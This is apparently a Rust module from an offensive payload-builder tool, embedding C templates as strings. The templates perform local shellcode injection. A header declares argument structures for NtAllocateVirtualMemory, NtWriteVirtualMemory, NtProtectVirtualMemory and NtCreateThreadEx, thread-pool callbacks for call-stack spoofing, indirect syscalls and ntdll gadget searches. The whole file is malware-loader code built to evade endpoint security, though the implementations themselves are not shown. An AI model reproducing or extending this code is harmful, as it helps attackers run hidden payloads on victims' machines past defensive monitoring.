pub const SPOOFSTACKSLOCALINJ_INCLUDE: &str = r#"
#include "../include/SpoofstacksLocalInj.h"
"#;

pub const SPOOFSTACKSLOCALINJ_CODE: &str = r#"

        LAUNCHER_STATUS LauncherStatus = CustomCallStacksCommonInj((PBYTE)pBuffer, sBufferSize, g_Nt);

        if (LauncherStatus != LAUNCHER_STATUS_SUCCESS)
        {
                printf("Error in CustomCallStacksCommonInj\n");
                return EXIT_FAILURE;
        }
        printf("Injection success");
"#;
pub const SPOOFSTACKSLOCALINJ_H: &str = r#"
#pragma once
#include <windows.h>
#include "./IndirectSyscall.h"

typedef enum LAUNCHER_STATUS
{
	LAUNCHER_STATUS_FAILED,
	LAUNCHER_STATUS_SUCCESS,
	LAUNCHER_STATUS_INVALID_PARAMETER,

} LAUNCHER_STATUS;
typedef NTSTATUS (NTAPI* TPALLOCWORK)(PTP_WORK* ptpWrk, PTP_WORK_CALLBACK pfnwkCallback, PVOID OptionalArg, PTP_CALLBACK_ENVIRON CallbackEnvironment);
typedef VOID (NTAPI* TPPOSTWORK)(PTP_WORK);
typedef VOID (NTAPI* TPRELEASEWORK)(PTP_WORK);


typedef struct _NTALLOCATEVIRTUALMEMORY_ARGS {
    HANDLE hProcess;
    PVOID* address;
    SIZE_T zeroBits;
    PSIZE_T size;
    ULONG allocationType;
    ULONG permissions;
    DWORD ssn;
} NTALLOCATEVIRTUALMEMORY_ARGS, *PNTALLOCATEVIRTUALMEMORY_ARGS;

typedef struct _NTWRITEVIRTUALMEMORY_ARGS {
    HANDLE hProcess;
    PVOID address;
    PVOID buffer;
    ULONG numberOfBytesToWrite;
    PULONG numberOfBytesWritten;
    DWORD ssn;
} NTWRITEVIRTUALMEMORY_ARGS, * PNTWRITEVIRTUALMEMORY_ARGS;

typedef struct _NTPROTECTVIRTUALMEMORY_ARGS {
    HANDLE hProcess;                     
    PVOID* address;                      
    PSIZE_T size;                        
    ULONG permissions;                   
    PULONG old_permissions;              
    DWORD ssn;
} NTPROTECTVIRTUALMEMORY_ARGS, *PNTPROTECTVIRTUALMEMORY_ARGS;

typedef struct _NTCREATETHREADEX_ARGS {
    PHANDLE threadHandle;        
    ACCESS_MASK desiredAccess;   
    PVOID objectAttributes;      
    HANDLE processHandle;        
    PVOID lpStartAddress;        
    PVOID lpParameter;           
    ULONG flags;                 
    SIZE_T stackZeroBits;        
    SIZE_T sizeOfStackCommit;    
    SIZE_T sizeOfStackReserve;   
    PVOID lpBytesBuffer;         
    DWORD ssn;                   
} NTCREATETHREADEX_ARGS, * PNTCREATETHREADEX_ARGS;
extern VOID CALLBACK CBNtAllocateVirtualMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
extern VOID CALLBACK CBNtWriteVirtualMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
extern VOID CALLBACK CBNtCreateThreadEx(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
extern VOID CALLBACK CBNtProtectVirtualMemory(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

extern VOID Search_For_Syscall_Ret(
    HANDLE ntdllHandle
);

extern VOID Search_For_Add_Rsp_Ret(
    HANDLE ntdllHandle
);

LAUNCHER_STATUS CustomCallStacksCommonInj(IN PVOID pBuffer, IN DWORD sBufferSize, IN PNTAPI_FUNC g_Nt);
"#;
